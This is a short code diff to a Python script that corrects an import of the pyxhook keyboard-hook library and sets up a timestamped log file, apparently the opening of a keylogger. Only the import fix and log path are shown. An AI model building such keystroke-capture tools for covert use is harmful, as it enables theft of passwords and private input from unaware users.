@@ -1,6 +1,6 @@
 import os
 from datetime import datetime
-from info.txt import pyxhook
+import pyxhook
 
 def main():
     log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
